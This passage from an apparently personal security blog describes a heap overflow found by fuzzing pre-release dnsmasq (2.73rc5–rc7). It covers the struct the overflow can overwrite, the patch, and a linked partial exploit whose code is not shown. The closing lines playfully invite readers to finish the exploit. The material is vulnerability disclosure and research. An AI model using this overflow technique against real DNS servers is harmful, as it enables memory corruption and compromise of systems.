  <span class="Type">struct</span> dhcp_relay *relay4, *relay6;
  <span class="Type">int</span> override;
  <span class="Type">int</span> enable_pxe;
  <span class="Type">int</span> doing_ra, doing_dhcp6;
  <span class="Type">struct</span> dhcp_netid_list *dhcp_ignore, *dhcp_ignore_names, *dhcp_gen_names;.
  <span class="Type">struct</span> dhcp_netid_list *force_broadcast, *bootp_dynamic;
  <span class="Type">struct</span> hostsfile *dhcp_hosts_file, *dhcp_opts_file, *dynamic_dirs;
  <span class="Type">int</span> dhcp_max, tftp_max;
  <span class="Type">int</span> dhcp_server_port, dhcp_client_port;
  <span class="Type">int</span> start_tftp_port, end_tftp_port;.
  <span class="Type">unsigned</span> <span class="Type">int</span> min_leasetime;
  <span class="Type">struct</span> doctor *doctors;
  <span class="Type">unsigned</span> <span class="Type">short</span> edns_pktsz;
  <span class="Type">char</span> *tftp_prefix;.
  <span class="Type">struct</span> tftp_prefix *if_prefix; <span class="Comment">/*</span><span class="Comment"> per-interface TFTP prefixes </span><span class="Comment">*/</span>
  <span class="Type">unsigned</span> <span class="Type">int</span> duid_enterprise, duid_config_len;
  <span class="Type">unsigned</span> <span class="Type">char</span> *duid_config;
  <span class="Type">char</span> *dbus_name;
  <span class="Type">unsigned</span> <span class="Type">long</span> soa_sn, soa_refresh, soa_retry, soa_expiry;
<span class="cPreCondit">#ifdef OPTION6_PREFIX_CLASS.</span>
  <span class="Type">struct</span> prefix_class *prefix_classes;
<span class="cPreCondit">#endif</span>
<span class="cPreCondit">#ifdef HAVE_DNSSEC</span>
  <span class="Type">struct</span> ds_config *ds;
  <span class="Type">char</span> *timestamp_file;
<span class="cPreCondit">#endif</span>

  <span class="Comment">/*</span><span class="Comment"> globally used stuff for DNS </span><span class="Comment">*/</span>
  <span class="Type">char</span> *packet; <span class="Comment">/*</span><span class="Comment"> packet buffer </span><span class="Comment">*/</span>
  <span class="Type">int</span> packet_buff_sz; <span class="Comment">/*</span><span class="Comment"> size of above </span><span class="Comment">*/</span>
  <span class="Type">char</span> *namebuff; <span class="Comment">/*</span><span class="Comment"> MAXDNAME size buffer </span><span class="Comment">*/</span>
<span class="cPreCondit">#ifdef HAVE_DNSSEC</span>
  <span class="Type">char</span> *keyname; <span class="Comment">/*</span><span class="Comment"> MAXDNAME size buffer </span><span class="Comment">*/</span>
  <span class="Type">char</span> *workspacename; <span class="Comment">/*</span><span class="Comment"> ditto </span><span class="Comment">*/</span>
<span class="cPreCondit">#endif</span>
  <span class="Type">unsigned</span> <span class="Type">int</span> local_answer, queries_forwarded, auth_answer;
  <span class="Type">struct</span> frec *frec_list;
  <span class="Type">struct</span> serverfd *sfds;
  <span class="Type">struct</span> irec *interfaces;
  <span class="Type">struct</span> listener *listeners;
  <span class="Type">struct</span> server *last_server;
  <span class="Type">time_t</span> forwardtime;
  <span class="Type">int</span> forwardcount;
  <span class="Type">struct</span> server *srv_save; <span class="Comment">/*</span><span class="Comment"> Used for resend on DoD </span><span class="Comment">*/</span>
  <span class="Type">size_t</span> packet_len;       <span class="Comment">/*</span><span class="Comment">      "        "        </span><span class="Comment">*/</span>
  <span class="Type">struct</span> randfd *rfd_save; <span class="Comment">/*</span><span class="Comment">      "        "        </span><span class="Comment">*/</span>
  pid_t tcp_pids[MAX_PROCS];
  <span class="Type">struct</span> randfd randomsocks[RANDOM_SOCKS];
  <span class="Type">int</span> v6pktinfo;.
  <span class="Type">struct</span> addrlist *interface_addrs; <span class="Comment">/*</span><span class="Comment"> list of all addresses/prefix lengths associated with all local interfaces </span><span class="Comment">*/</span>
  <span class="Type">int</span> log_id, log_display_id; <span class="Comment">/*</span><span class="Comment"> ids of transactions for logging </span><span class="Comment">*/</span>
  <span class="Type">union</span> mysockaddr *log_source_addr;

  <span class="Comment">/*</span><span class="Comment"> DHCP state </span><span class="Comment">*/</span>
  <span class="Type">int</span> dhcpfd, helperfd, pxefd;.
<span class="cPreCondit">#ifdef HAVE_INOTIFY</span>
  <span class="Type">int</span> inotifyfd;
<span class="cPreCondit">#endif</span>
<span class="cPreCondit">#if defined(HAVE_LINUX_NETWORK)</span>
  <span class="Type">int</span> netlinkfd;
<span class="cPreCondit">#elif defined(HAVE_BSD_NETWORK)</span>
  <span class="Type">int</span> dhcp_raw_fd, dhcp_icmp_fd, routefd;
<span class="cPreCondit">#endif</span>
  <span class="Type">struct</span> iovec dhcp_packet;
  <span class="Type">char</span> *dhcp_buff, *dhcp_buff2, *dhcp_buff3;
  <span class="Type">struct</span> ping_result *ping_results;
  <span class="Type">FILE</span> *lease_stream;
  <span class="Type">struct</span> dhcp_bridge *bridges;
<span class="cPreCondit">#ifdef HAVE_DHCP6</span>
  <span class="Type">int</span> duid_len;
  <span class="Type">unsigned</span> <span class="Type">char</span> *duid;
  <span class="Type">struct</span> iovec outpacket;
  <span class="Type">int</span> dhcp6fd, icmp6fd;
<span class="cPreCondit">#endif</span>
  <span class="Comment">/*</span><span class="Comment"> DBus stuff </span><span class="Comment">*/</span>
  <span class="Comment">/*</span><span class="Comment"> void * here to avoid depending on dbus headers outside dbus.c </span><span class="Comment">*/</span>
  <span class="Type">void</span> *dbus;
<span class="cPreCondit">#ifdef HAVE_DBUS</span>
  <span class="Type">struct</span> watch *watches;
<span class="cPreCondit">#endif</span>

  <span class="Comment">/*</span><span class="Comment"> TFTP stuff </span><span class="Comment">*/</span>
  <span class="Type">struct</span> tftp_transfer *tftp_trans, *tftp_done_trans;

  <span class="Comment">/*</span><span class="Comment"> utility string buffer, hold max sized IP address as string </span><span class="Comment">*/</span>
  <span class="Type">char</span> *addrbuff;
  <span class="Type">char</span> *addrbuff2; <span class="Comment">/*</span><span class="Comment"> only allocated when OPT_EXTRALOG </span><span class="Comment">*/</span>
} *daemon;
```

I haven't measured how far into that structure you can write, but the total number of bytes we can write into the 1024-byte buffer is 1368 bytes, so somewhere in the realm of the first 300 bytes are at risk.

The reason we saw a "null pointer dereference" and also a "write NUL byte to arbitrary memory" are both because we overwrote variables from that structure that are used later.

## Patch

The patch is pretty straight forward: add 1 to <tt>namelen</tt> for the periods. There was a second version of the same vulnerability (forgotten period) in the 0x40 handler as well.

But..... I'm concerned about the whole idea of building a string and tracking the length next to it. That's a dangerous design pattern, and the chances of regressing when modifying any of the name parsing is high.

## Exploit so-far

I started writing an exploit for it. Before I stopped, I basically found a way to brute-force build a string that would overwrite an arbitrary number of bytes by adding the right amount of padding and the right number of periods. That turned out to be a fairly difficult job, because there are various things you have to juggle (the padding at the front of the string and the size of the repeated field). It turns out, the maximum length you can get is 1368 bytes put into a 1024-byte buffer.

You can download it [here](https://blogdata.skullsecurity.org/dnsmasq-partial-sploit.rb).

## ...why it never got famous

I held this back throughout the blog because it's the sad part. :)

It turns out, since I was working from the git HEAD version, it was brand new code. After bissecting versions to figure out where the vulnerable code came from, I determined that it was present only in 2.73rc5 - 2.73rc7. After I reported it, the [author rolled out 2.73rc8](http://lists.thekelleys.org.uk/pipermail/dnsmasq-discuss/2015q2/009529.html) with the fix.

It was disappointing, to say the least, but on the plus side the process was interesting enough to write about! :)

## Conclusion

So to summarize everything...

- I modified dnsmasq to read packets from a file instead of the network, then used afl-fuzz to fuzz and crash it.
- I found a vulnerability that was recently introduced, when parsing "\\xc0\\x0c" names + using periods.
- I triaged the vulnerability, and started writing an exploit.
- Determined that the vulnerability was in brand new code, so I gave up on the exploit and decided to write a blog instead.

And who knows, maybe somebody will develop one for fun? If anybody does, I'll give them *a month of Reddit Gold*!!!! :)

(I'm kidding about using that as a motivator, but I'll really do it if anybody bothers :P)